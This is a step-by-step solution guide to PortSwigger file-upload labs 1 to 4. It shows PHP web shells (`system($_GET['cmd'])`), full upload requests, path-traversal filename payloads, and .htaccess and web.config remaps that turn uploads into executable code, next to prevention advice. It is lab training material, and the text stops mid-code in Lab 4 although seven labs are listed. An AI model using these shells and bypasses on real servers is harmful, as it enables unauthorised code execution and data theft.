# PortSwigger File Upload Vulnerabilities - Complete Lab Solutions

## Table of Contents
1. [Lab 1: Remote Code Execution via Web Shell Upload](#lab-1-remote-code-execution-via-web-shell-upload)
2. [Lab 2: Web Shell Upload via Content-Type Restriction Bypass](#lab-2-web-shell-upload-via-content-type-restriction-bypass)
3. [Lab 3: Web Shell Upload via Path Traversal](#lab-3-web-shell-upload-via-path-traversal)
4. [Lab 4: Web Shell Upload via Extension Blacklist Bypass](#lab-4-web-shell-upload-via-extension-blacklist-bypass)
5. [Lab 5: Web Shell Upload via Obfuscated File Extension](#lab-5-web-shell-upload-via-obfuscated-file-extension)
6. [Lab 6: Remote Code Execution via Polyglot Web Shell Upload](#lab-6-remote-code-execution-via-polyglot-web-shell-upload)
7. [Lab 7: Web Shell Upload via Race Condition](#lab-7-web-shell-upload-via-race-condition)

---

## Lab 1: Remote Code Execution via Web Shell Upload

**Difficulty**: APPRENTICE
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

### Vulnerability Description
This lab demonstrates the most basic file upload vulnerability where the application accepts and stores user-uploaded files without any validation. The server doesn't check file type, content, or extension, allowing direct upload and execution of PHP web shells.

### Learning Objectives
- Understand unrestricted file upload vulnerabilities
- Learn to create basic PHP web shells
- Practice using Burp Suite to identify upload paths
- Execute remote commands through uploaded files

### Step-by-Step Solution

#### Phase 1: Reconnaissance
1. Navigate to the lab and log in with credentials `wiener:peter`
2. Go to "My Account" page
3. Notice the avatar/profile picture upload functionality
4. Upload a legitimate image file first to test the mechanism

#### Phase 2: Map Upload Behavior
1. Open Burp Suite and examine **Proxy > HTTP history**
2. Apply filters to show image requests:
   - Click the filter bar
   - Under "MIME type", check the "Images" checkbox
3. Locate the GET request showing your uploaded image
   - Example: `GET /files/avatars/image.jpg HTTP/1.1`
4. Note the upload path: `/files/avatars/`
5. Right-click this request and select **Send to Repeater**

#### Phase 3: Create Malicious Payload
Create a file named `exploit.php` containing:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Payload Explanation**:
- `file_get_contents()`: PHP function that reads entire file into a string
- `/home/carlos/secret`: Absolute path to target file (provided in lab description)
- `echo`: Outputs the file contents to the HTTP response

#### Phase 4: Upload Web Shell
1. Return to the avatar upload form in your browser
2. Select your `exploit.php` file
3. Click "Upload" or "Submit"
4. Observe the success message confirming upload

#### Phase 5: Execute and Extract
1. Switch to Burp Repeater tab with the image GET request
2. Modify the request path from your image filename to `exploit.php`:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [your-lab-id].web-security-academy.net
```
3. Click **Send**
4. In the response panel, you'll see the contents of Carlos's secret file
5. Copy the secret value

#### Phase 6: Complete Lab
1. Click the "Submit solution" button in the lab banner
2. Paste the secret value
3. Lab marked as solved!

### HTTP Requests and Responses

**Upload Request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION_TOKEN

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

CSRF_TOKEN_VALUE
------WebKitFormBoundary--
```

**Successful Upload Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

The file avatars/exploit.php has been uploaded.
```

**Execution Request**:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Execution Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

[SECRET_VALUE_DISPLAYED_HERE]
```

### Key Techniques
- **Direct file upload exploitation**: No validation allows immediate shell upload
- **PHP code execution**: Server executes PHP files when accessed via HTTP
- **Path identification**: Using Burp history to discover file storage locations
- **Request replay**: Using Burp Repeater to test exploitation

### Burp Suite Features Utilized
1. **Proxy > HTTP History**: Captures all HTTP traffic for analysis
2. **MIME Type Filtering**: Quickly isolate image/file requests
3. **Repeater**: Manually modify and resend requests
4. **Request Inspection**: View multipart form data structure

### Common Pitfalls and Troubleshooting

| Problem | Solution |
|---------|----------|
| File returns 404 Not Found | Verify exact filename in upload response; check /files/avatars/ path |
| PHP code displayed as text | Ensure requesting .php file (not .txt); verify PHP is enabled in that directory |
| Empty response | Check payload syntax; ensure file_get_contents() path is correct |
| Can't find uploaded file | Review Burp history for upload response showing storage location |
| Session expired | Re-login and repeat upload process with fresh session cookie |

### Alternative Payloads

**Generic command execution**:
```php
<?php system($_GET['cmd']); ?>
```
Usage: `/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret`

**Full web shell with output formatting**:
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
```

**Multiple command execution**:
```php
<?php
if(isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}
?>
```

### Real-World Impact
This vulnerability represents complete server compromise:
- **Remote Code Execution (RCE)**: Execute arbitrary system commands
- **Data Exfiltration**: Read sensitive files, databases, credentials
- **Lateral Movement**: Use compromised server to attack internal network
- **Persistence**: Install backdoors for continued access
- **Denial of Service**: Crash services or consume resources

### Prevention Measures
- Implement file type validation (whitelist approach)
- Validate file content (magic bytes, not just extension)
- Store uploaded files outside web root
- Disable script execution in upload directories
- Rename uploaded files to prevent direct access
- Implement Content Security Policy (CSP)
- Use a dedicated file storage service (S3, Azure Blob)

---

## Lab 2: Web Shell Upload via Content-Type Restriction Bypass

**Difficulty**: APPRENTICE
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

### Vulnerability Description
This lab implements a defense mechanism that validates the MIME type of uploaded files by checking the `Content-Type` header. However, this header is entirely user-controllable and sent by the client, making it trivial to bypass. The server trusts this client-supplied value without validating actual file contents.

### Learning Objectives
- Understand MIME type validation weaknesses
- Learn to manipulate HTTP headers in upload requests
- Practice using Burp Suite to modify Content-Type headers
- Recognize client-side vs. server-side validation issues

### Step-by-Step Solution

#### Step 1: Authentication & Initial Upload
1. Access the lab and log in with credentials `wiener:peter`
2. Navigate to "My Account" page
3. Upload a legitimate image file (JPEG or PNG) as your avatar
4. Confirm successful upload

#### Step 2: Identify Upload Mechanism
1. Open Burp Suite and go to **Proxy > HTTP history**
2. Locate the GET request retrieving your uploaded avatar:
   - Example: `GET /files/avatars/[your-image].jpg`
3. Right-click and **Send to Repeater** for later exploitation

#### Step 3: Create Malicious Payload
Create `exploit.php` with the following content:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Step 4: Attempt Initial Upload
1. Go back to the avatar upload form
2. Try uploading `exploit.php`
3. Observe the error message:
   ```
   Sorry, only JPG & PNG files are allowed
   Sorry, there was an error uploading your file.
   ```
   Or similar: `You are only allowed to upload files with the MIME type image/jpeg or image/png`

This confirms the server validates Content-Type headers.

#### Step 5: Intercept Upload Request
1. Enable **Proxy > Intercept** in Burp Suite
2. In the browser, attempt to upload `exploit.php` again
3. Burp intercepts the request before it reaches the server
4. **Option A**: Right-click intercepted request > **Send to Repeater**, then drop the request
5. **Option B**: Find the request in HTTP history and send to Repeater

#### Step 6: Modify Content-Type Header
In Burp Repeater, locate the multipart form data section:

**Original request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--
```

**Modify the Content-Type line**:
```http
Content-Type: image/jpeg
```

**Complete modified request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

CSRF_TOKEN
------WebKitFormBoundary--
```

#### Step 7: Send Modified Request
1. Click **Send** in Burp Repeater
2. Check the response - it should indicate successful upload
3. Note the uploaded filename in the response

#### Step 8: Execute Web Shell
1. Switch to the Repeater tab with the GET request for avatar retrieval
2. Modify the path to request your uploaded exploit:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
```
3. Click **Send**
4. The response body contains Carlos's secret

#### Step 9: Submit Solution
1. Copy the secret value from the response
2. Click "Submit solution" in the lab banner
3. Paste the secret to complete the lab

### HTTP Requests and Responses

**Failed Upload (Before Bypass)**:
```http
HTTP/1.1 403 Forbidden
Content-Type: text/html

Sorry, only JPG & PNG files are allowed
```

**Successful Upload (After Content-Type Modification)**:
```http
HTTP/1.1 200 OK
Content-Type: text/html

The file avatars/exploit.php has been uploaded.
```

**Execution Request**:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=YOUR_SESSION
```

**Execution Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html

[CARLOS_SECRET_VALUE]
```

### Key Techniques

#### MIME Type Manipulation
- **Content-Type Header**: User-controllable, sent by client
- **Server Trust Issue**: Application trusts client-supplied MIME type
- **No Content Validation**: Server doesn't verify actual file contents

#### Valid MIME Types for Images
```
image/jpeg
image/png
image/gif
image/bmp
image/webp
image/svg+xml
```

### Burp Suite Features Utilized
1. **Proxy > Intercept**: Intercept requests before they reach the server
2. **Repeater**: Modify and resend requests multiple times
3. **HTTP History**: Review and analyze all traffic
4. **Request Editor**: Manually edit HTTP headers and body content

### Common Pitfalls and Troubleshooting

| Problem | Solution |
|---------|----------|
| Can't find Content-Type to modify | Look in multipart form data section, NOT the main request header |
| Modified request still rejected | Ensure you changed file-specific Content-Type, not boundary Content-Type |
| File uploaded but won't execute | Verify exact filename from response; check GET request path |
| Syntax error in Burp | Ensure proper multipart boundaries and line breaks |
| Session expired during testing | Re-login and use fresh session cookie in requests |

### Alternative Exploitation Methods

**Using Burp Intruder**:
1. Send upload request to Intruder
2. Mark Content-Type value as payload position: `Content-Type: §application/x-php§`
3. Load payload list with valid MIME types
4. Start attack and identify successful uploads

**Using curl**:
```bash
curl -X POST http://[lab-id].web-security-academy.net/my-account/avatar \
  -H "Cookie: session=YOUR_SESSION" \
  -F "avatar=@exploit.php;type=image/jpeg" \
  -F "user=wiener" \
  -F "csrf=TOKEN"
```

### Why This Bypass Works

**Client-Side Trust Issue**:
```
1. Browser sets Content-Type based on file extension
2. Application reads this header from the request
3. Application validates ONLY this header value
4. No validation of actual file content (magic bytes)
5. If header says "image/jpeg", application trusts it
```

**Proper Validation Should**:
1. Check Content-Type header (first layer)
2. Verify file extension (second layer)
3. Read and validate magic bytes (critical layer)
4. Scan file content for malicious code (defense in depth)

### Real-World Examples

**Common Vulnerable Code (PHP)**:
```php
// VULNERABLE - trusts client input
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
```

**Secure Implementation**:
```php
// Secure - validates actual content
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed = ['image/jpeg', 'image/png'];
if (in_array($mime, $allowed)) {
    // Additional validation: extension, magic bytes, etc.
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $safe_filename);
}
```

### Prevention Measures
1. **Never trust client-supplied headers** - Content-Type is user-controllable
2. **Validate file content** - Read magic bytes to verify actual file type
3. **Use server-side MIME detection** - Libraries like `fileinfo` in PHP
4. **Whitelist extensions** - Only allow specific, safe extensions
5. **Store files outside web root** - Prevent direct execution
6. **Disable script execution** - Configure web server to not execute scripts in upload directories
7. **Rename uploaded files** - Generate random names, store mapping in database
8. **Scan for malware** - Use antivirus/malware scanning services

---

## Lab 3: Web Shell Upload via Path Traversal

**Difficulty**: PRACTITIONER
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

### Vulnerability Description
This lab demonstrates a scenario where PHP file uploads are allowed, but code execution is disabled in the upload directory (`/files/avatars/`) through web server configuration. However, the application fails to properly sanitize directory traversal sequences in filenames, allowing attackers to upload files to parent directories where execution is enabled. The vulnerability is compounded by URL decoding that occurs after filename validation.

### Learning Objectives
- Understand path traversal in file upload contexts
- Learn URL encoding bypass techniques
- Practice identifying execution vs. non-execution directories
- Exploit validation logic flaws (validate before decode)

### Step-by-Step Solution

#### Phase 1: Reconnaissance
1. Log in with credentials `wiener:peter`
2. Navigate to "My Account" page
3. Upload a legitimate image to test the upload mechanism
4. Open Burp Suite **Proxy > HTTP history**
5. Find the GET request for your uploaded image:
   - Example: `GET /files/avatars/[image-name].jpg`
6. Right-click and **Send to Repeater** (for later exploitation)

#### Phase 2: Create Exploit Payload
Create a file named `exploit.php`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Phase 3: Upload and Test Direct Access
1. Upload `exploit.php` as your avatar
2. Server accepts the upload (no file type restrictions)
3. In Burp Repeater, request the uploaded file:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
```
4. **Result**: PHP source code is returned as plain text, not executed

**Response shows**:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This confirms PHP execution is disabled in `/files/avatars/` directory.

#### Phase 4: Attempt Path Traversal
1. Locate the `POST /my-account/avatar` upload request in Proxy history
2. Right-click and **Send to Repeater**
3. Modify the filename in the Content-Disposition header:

**Original**:
```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
```

**Modified with path traversal**:
```
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

4. Click **Send**
5. **Response indicates**:
```
The file avatars/exploit.php has been uploaded.
```

The server stripped the `../` sequence, thwarting the attempt.

#### Phase 5: URL Encoding Bypass
The server validates filenames before URL decoding them. By URL-encoding the forward slash, we can bypass the traversal filter.

**Modify the filename**:
```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

**Complete request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

CSRF_TOKEN
------WebKitFormBoundary--
```

**Send the request**

**Response confirms bypass**:
```
The file avatars/../exploit.php has been uploaded.
```

This indicates the server decoded `%2f` to `/` AFTER validation, creating a valid path traversal.

#### Phase 6: Verify File Location
The file is now uploaded to `/files/` (parent of `/files/avatars/`), where PHP execution is enabled.

#### Phase 7: Execute and Extract
1. Return to your browser and visit the account page (or refresh)
2. In Burp Proxy history, look for the GET request to retrieve your avatar
3. You should see:
```http
GET /files/avatars/..%2fexploit.php HTTP/1.1
```
4. The response contains Carlos's secret (file executed successfully!)

**Alternative**: Manually request the file in Repeater:
```http
GET /files/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
```

#### Phase 8: Submit Solution
1. Copy the secret from the response
2. Click "Submit solution" in lab banner
3. Paste the secret to complete the lab

### HTTP Requests and Responses

**Failed Traversal Attempt (Literal ../)**:
```http
POST /my-account/avatar HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
...
```

**Response**:
```http
HTTP/1.1 200 OK

The file avatars/exploit.php has been uploaded.
```
(../ was stripped)

**Successful Traversal (URL-Encoded)**:
```http
POST /my-account/avatar HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
...
```

**Response**:
```http
HTTP/1.1 200 OK

The file avatars/../exploit.php has been uploaded.
```

**Execution Request**:
```http
GET /files/avatars/..%2fexploit.php HTTP/1.1
```
Or:
```http
GET /files/exploit.php HTTP/1.1
```

**Execution Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html

[CARLOS_SECRET_VALUE]
```

### Specific Techniques and Bypass Methods

#### Path Traversal Encoding Techniques

| Technique | Example | Purpose |
|-----------|---------|---------|
| **Basic Traversal** | `../exploit.php` | Move up one directory |
| **URL Encoded Slash** | `..%2fexploit.php` | Bypass filters that strip literal `../` |
| **Double URL Encoding** | `..%252fexploit.php` | Bypass double-decode scenarios |
| **Backslash (Windows)** | `..\exploit.php` | Windows path traversal |
| **URL Encoded Backslash** | `..%5cexploit.php` | Windows bypass |
| **Mixed Separators** | `..\%2fexploit.php` | Confuse parsers |
| **Double Traversal** | `....//exploit.php` | Bypass stripping (becomes `../`) |
| **Absolute Paths** | `/var/www/html/exploit.php` | Direct path specification |

#### URL Encoding Reference
```
/ (forward slash)  = %2f
\ (backslash)      = %5c
. (dot)            = %2e
: (colon)          = %3a
```

#### Advanced Traversal Payloads
```
..%2fexploit.php
..%2f..%2fexploit.php
..%2f..%2f..%2fexploit.php
%2e%2e%2fexploit.php
%2e%2e/exploit.php
..%252fexploit.php (double encoded)
..%c0%afexploit.php (Unicode)
```

### Burp Suite Features Utilized

1. **Proxy > HTTP History**: Monitor upload and retrieval requests
2. **Burp Repeater**: Craft and test modified requests iteratively
3. **Request Editor**: Manually edit multipart form data
4. **Response Comparison**: Compare successful vs. failed attempts
5. **URL Decoder**: Understand encoding transformations (Decoder tab)

### Common Pitfalls and Troubleshooting

| Issue | Solution |
|-------|----------|
| **PHP returns as plain text** | File is in non-executable directory; use traversal to move to parent |
| **Server strips `../`** | URL-encode the forward slash as `%2f` |
| **Upload fails entirely** | Check Content-Disposition format; ensure proper boundaries |
| **404 after successful upload** | Access via traversal path (`..%2f`) or directly in parent directory |
| **Filename validation error** | Some servers reject `%` in filenames; try alternatives |
| **Wrong secret submitted** | Ensure file actually executed (not just uploaded); verify execution path |

### Why This Bypass Works

**Vulnerability Root Cause**:
```
1. Application validates filename: "../exploit.php"
   - Filter detects "../" and strips it
   - Validation passes

2. Application performs URL decoding: "..%2fexploit.php"
   - Decode happens AFTER validation
   - %2f becomes /
   - Final filename: ../exploit.php

3. File system operation uses decoded name
   - Saves to: /files/avatars/../exploit.php
   - Resolves to: /files/exploit.php
   - PHP execution enabled in /files/
```

**Processing Order Flaw**:
```
VULNERABLE:  Validate → Decode → Use
SECURE:      Decode → Validate → Use
```

### Real-World Impact

This vulnerability enables:
1. **Bypass of execution restrictions**: Upload to unrestricted directories
2. **Overwrite critical files**: Target config files, .htaccess, etc.
3. **Web root compromise**: Upload directly to document root
4. **Configuration file abuse**: Overwrite application settings
5. **Code execution**: Achieve RCE by placing shells in executable locations

### Prevention Measures

#### Filename Sanitization
```php
// VULNERABLE
$filename = $_FILES['file']['name'];
$filename = str_replace('../', '', $filename);  // Can be bypassed
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);

// SECURE
$filename = basename($_FILES['file']['name']);  // Removes path components
$filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename);  // Whitelist chars
$safe_name = uniqid() . '_' . $filename;  // Randomize
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $safe_name);
```

#### Proper Validation Order
```php
// Decode BEFORE validation
$filename = urldecode($_FILES['file']['name']);
if (strpos($filename, '../') !== false || strpos($filename, '..\\') !== false) {
    die('Path traversal detected');
}
```

#### Defense in Depth
1. **Use `basename()`**: Strips directory components automatically
2. **Validate after all decoding**: Ensure no encoding tricks bypass filters
3. **Whitelist characters**: Only allow alphanumeric and safe characters
4. **Generate random filenames**: Don't use user-supplied names at all
5. **Store outside web root**: Upload to non-accessible location
6. **Disable directory traversal**: Web server configuration (chroot, filesystem restrictions)
7. **Path canonicalization**: Resolve all paths to absolute form before validation

#### Web Server Configuration

**Apache (.htaccess in upload directory)**:
```apache
# Disable PHP execution
php_flag engine off
AddType text/plain .php .php3 .php4 .php5 .phtml

# Or prevent all script execution
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    Deny from all
</FilesMatch>
```

**Nginx**:
```nginx
location /files/avatars/ {
    location ~ \.php$ {
        return 403;
    }
}
```

---

## Lab 4: Web Shell Upload via Extension Blacklist Bypass

**Difficulty**: PRACTITIONER
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

### Vulnerability Description
This lab implements a blacklist-based defense that blocks dangerous file extensions like `.php`. However, the application runs on an Apache web server that respects `.htaccess` configuration files, which can be used to override server settings on a per-directory basis. By uploading a malicious `.htaccess` file that remaps an arbitrary file extension to be executed as PHP, attackers can bypass the blacklist and achieve code execution.

### Learning Objectives
- Understand weaknesses of blacklist-based validation
- Learn Apache .htaccess exploitation techniques
- Practice multi-stage upload attacks
- Understand MIME type remapping vulnerabilities

### Step-by-Step Solution

#### Phase 1: Reconnaissance
1. Log in with credentials `wiener:peter`
2. Navigate to the "My Account" page
3. Upload a legitimate image file as your avatar
4. Open Burp Suite **Proxy > HTTP history**
5. Locate the GET request for your uploaded avatar:
   - Example: `GET /files/avatars/[image].jpg`
6. Examine response headers to identify server type:
```http
Server: Apache/2.4.41 (Ubuntu)
```
This confirms Apache is in use, making .htaccess exploitation viable.

#### Phase 2: Create Exploit Payload
Create a file named `exploit.php`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Phase 3: Test Extension Blacklist
1. Attempt to upload `exploit.php` through the avatar form
2. Observe the rejection message:
```
Sorry, php files are not allowed
Sorry, there was an error uploading your file.
```
Or similar: "file extension not allowed"

This confirms `.php` extension is blacklisted.

#### Phase 4: Prepare .htaccess Configuration
Create a file named `.htaccess` containing:
```apache
AddType application/x-httpd-php .l33t
```

**Explanation**:
- `AddType`: Apache directive to map file extensions to MIME types
- `application/x-httpd-php`: MIME type that tells Apache to process files as PHP
- `.l33t`: Arbitrary custom extension (can be any string)

**Alternative configurations**:
```apache
# Option 1: Using AddHandler
AddHandler application/x-httpd-php .l33t

# Option 2: Multiple extensions
AddType application/x-httpd-php .jpg .png .gif

# Option 3: Process all files as PHP
SetHandler application/x-httpd-php
```

#### Phase 5: Upload .htaccess File
1. Locate the `POST /my-account/avatar` request in Burp history
2. Right-click and **Send to Repeater**
3. Modify the request to upload your `.htaccess` file:

**Modified request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

CSRF_TOKEN
------WebKitFormBoundary--
```

**Key points**:
- Filename is `.htaccess` (note the leading dot)
- Content-Type is `text/plain` (not critical but appropriate)
- Content is the AddType directive

4. Click **Send** in Burp Repeater
5. Verify successful upload in response:
```
The file avatars/.htaccess has been uploaded.
```

#### Phase 6: Upload Exploit with Custom Extension
1. In the same Repeater tab, modify the request again
2. This time upload your exploit with the `.l33t` extension:

**Modified request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

CSRF_TOKEN
------WebKitFormBoundary--
```

3. Click **Send**
4. Confirm successful upload:
```
The file avatars/exploit.l33t has been uploaded.
```

#### Phase 7: Execute and Exfiltrate
1. Find the GET request for avatar retrieval in your Repeater tabs
2. Modify the path to request your `.l33t` file:
```http
GET /files/avatars/exploit.l33t HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=YOUR_SESSION
```

3. Click **Send**
4. **Response contains Carlos's secret**:
```http
HTTP/1.1 200 OK
Content-Type: text/html

[SECRET_VALUE_HERE]
```

The `.htaccess` file instructs Apache to process `.l33t` files as PHP, executing your code.

#### Phase 8: Submit Solution
1. Copy the secret value from the response
2. Click "Submit solution" in the lab banner
3. Paste the secret to complete the lab

### HTTP Requests and Responses

**Upload .htaccess Request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
------WebKitFormBoundary--
```

**Upload .htaccess Response**:
```http
HTTP/1.1 200 OK

The file avatars/.htaccess has been uploaded.
```

**Upload Exploit Request**:
```http
POST /my-account/avatar HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--
```

**Upload Exploit Response**:
```http
HTTP/1.1 200 OK

The file avatars/exploit.l33t has been uploaded.
```

**Execution Request**:
```http
GET /files/avatars/exploit.l33t HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Execution Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html
X-Powered-By: PHP/7.4.3

[CARLOS_SECRET_VALUE]
```

### Specific Techniques and Bypass Methods

#### Apache .htaccess Exploitation

**Extension Remapping**:
```apache
# Map single extension
AddType application/x-httpd-php .jpg

# Map multiple extensions
AddType application/x-httpd-php .jpg .png .gif

# Using AddHandler instead
AddHandler application/x-httpd-php .shell
```

**Process All Files as PHP**:
```apache
SetHandler application/x-httpd-php
```
⚠️ This makes EVERY file in the directory execute as PHP (very dangerous)

**Conditional Processing**:
```apache
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Enable CGI Execution**:
```apache
Options +ExecCGI
AddHandler cgi-script .jpg
```

#### Alternative Custom Extensions
Instead of `.l33t`, you can use any non-blacklisted extension:
```
.shell
.pwn
.hax
.backdoor
.phtml (if not blacklisted)
.php7 (if not blacklisted)
.inc (if not blacklisted)
```

#### IIS Equivalent: web.config

For Microsoft IIS servers, upload `web.config` instead:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI"
                 path="*.jpg"
                 verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\PHP\php-cgi.exe"
                 resourceType="Unspecified"
                 requireAccess="Script" />
        </handlers>
    </system.webServer>
</configuration>
```

### Burp Suite Features Utilized

1. **Proxy > HTTP History**: Capture and analyze traffic
2. **Repeater**: Sequential file uploads with modifications
3. **Response Analysis**: Verify uploads and execution
4. **Server Header Detection**: Identify Apache for .htaccess targeting

### Common Pitfalls and Troubleshooting

| Problem | Solution |
|---------|----------|
| **.htaccess upload rejected** | Some apps block dotfiles; try other config file names or extensions |
| **.htaccess uploaded but not working** | Verify Apache `AllowOverride` is enabled; check directory configuration |
| **Custom extension doesn't execute** | Ensure .htaccess uploaded BEFORE the exploit file; verify .htaccess content |
| **Wrong Content-Type for .htaccess** | Use `text/plain` or `application/octet-stream` |
| **File not found** | Verify exact filenames from upload responses; check case sensitivity |
| **PHP code displayed as text** | .htaccess not processed; server may not allow overrides |

### Why This Bypass Works

**Apache .htaccess Processing**:
```
1. Apache serves request for exploit.l33t
2. Before processing, checks for .htaccess in directory
3. Reads and applies directives from .htaccess
4. Directive maps .l33t → application/x-httpd-php
5. Apache processes file through PHP interpreter
6. PHP code executes, returns secret
```

**AllowOverride Configuration**:
Apache must have `AllowOverride` enabled:
```apache
<Directory /var/www/html/files/avatars>
    AllowOverride All  # Allows .htaccess files to override settings
</Directory>
```

If `AllowOverride None`, .htaccess files are ignored.

### Real-World Examples

#### CVE-2019-19365: WordPress File Manager
A popular WordPress plugin allowed .htaccess uploads, enabling RCE.

#### CVE-2018-19422: Multiple CMS Platforms
Several CMS platforms failed to block .htaccess uploads in their media managers.

### Attack Variations

#### Variation 1: Process Images as PHP
```apache
# .htaccess content
AddType application/x-httpd-php .jpg
```
Upload image.jpg with PHP code → executes as PHP

#### Variation 2: CGI Script Execution
```apache
Options +ExecCGI
AddHandler cgi-script .pl
```
Upload Perl script with .pl extension → executes as CGI

#### Variation 3: Combine with Polyglot
```apache
# .htaccess
AddType application/x-httpd-php .jpg
```
Upload valid JPEG with embedded PHP → image + shell

#### Variation 4: Directory Traversal + .htaccess
```
1. Upload .htaccess to /uploads/
2. Use path traversal to upload shell to different directory
3. Access shell through traversal path with .htaccess rules applied
```

### Prevention Measures

#### Block Configuration Files
```php
$blacklist = ['.htaccess', '.htpasswd', 'web.config', '.user.ini'];
$filename = basename($_FILES['file']['name']);
if (in_array(strtolower($filename), $blacklist)) {
    die('Configuration files not allowed');
}
```

#### Disable .htaccess Override
Apache configuration:
```apache
<Directory /var/www/html/uploads>
    AllowOverride None
    Options -Indexes -ExecCGI
    <FilesMatch "\.(php|phtml|php3|php4|php5)$">
        Deny from all
    </FilesMatch>
</Directory>
```

#### Whitelist-Based Validation
```php
// Only allow specific extensions
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
